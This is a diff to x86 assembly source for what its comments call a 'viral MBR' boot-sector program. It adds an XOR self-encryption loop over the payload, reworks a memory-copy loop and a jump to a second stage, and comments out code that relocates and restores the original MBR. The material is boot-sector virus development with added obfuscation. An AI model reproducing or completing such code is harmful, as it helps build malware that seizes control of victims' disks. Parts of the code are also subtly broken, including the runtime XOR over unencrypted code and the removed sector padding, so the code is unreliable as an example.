@@ -57,6 +57,22 @@ mov		ax, 0x7c00
 mov		sp, ax
 sti
 
+
+
+crypt:
+	push cs
+	pop es
+	push cs
+	pop ds
+	lea si, load_vx_paint
+	lea di, load_vx_paint
+	mov cx, cryptlen 
+	crypt_loop:
+		lodsb
+		xor al, 12h
+		stosb
+		loop crypt_loop
+	
 load_vx_paint:
 	mov ax, 0x0		;reset disk
 	int 13h
@@ -86,17 +102,51 @@ load_vx_paint:
 		;inc cl
 		;mov byte [sector_count], cl
 		mov cx, 2400
-		loop:
-			mov word ax, [bx]
-			mov word [es:di], ax
-			add bx,2
-			add di,2
-			dec cx
-			cmp cx, 0
-			jnz loop
-		repnz
+;		call loop
+
+;	loop:
+;		mov word ax, [bx]
+;		mov word [es:di], ax
+;		add bx,2
+;		add di,2
+;		dec cx
+;		cmp cx, 0
+;		jnz loop
+;;		repnz
+;;		ret
 	
+;	push cs						;copy the code here (the viral MBR) 
+;	pop es						;to address 0000:0x600
+;	mov di, 0x600				;this is typical MBR behavior
+;	mov bx, VX_BOOT ;ax=VXBOOT
+;	call loop
+;	jmp idontplaytagb
 	
+	loop:
+		mov word ax, [bx]
+		mov word [es:di], ax
+		add bx,2
+		add di,2
+		dec cx
+		cmp cx, 0
+		jnz loop
+;		ret
+	;mov ax, 0x201	;read one sectors of disk
+	;mov ch, 0		;retrieve OG MBR
+	;mov cl, 3		;cylinder 0, sector 3 
+	;mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
+	;mov bx, 0x200
+	;int 13h
+	
+	;copy original MBR to this address 0000:0x7c00
+	;
+	;push cs						;copy the code here (the viral MBR) 
+	;pop es						;to address 0000:0x600
+	;mov di, 0x7C00				;this is typical MBR behavior
+	;jmp loop	
+
+idontplaytagb:	
+	;call boot2nd:0 
 	jmp boot2nd:0
 
 ;sector_count:
@@ -111,6 +161,7 @@ DefaultDisk:
 	db 0x80
 
 boot2nd equ 0x900
+cryptlen equ $-crypt
 
 partition_start:	
 	times 0x1BE-($-$$) db 0
@@ -122,7 +173,7 @@ db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 
 VXend:
-	times 510-($-$$) db 0
+;	times 510-($-$$) db 0
 	db 0x55
 	db 0xAA
 
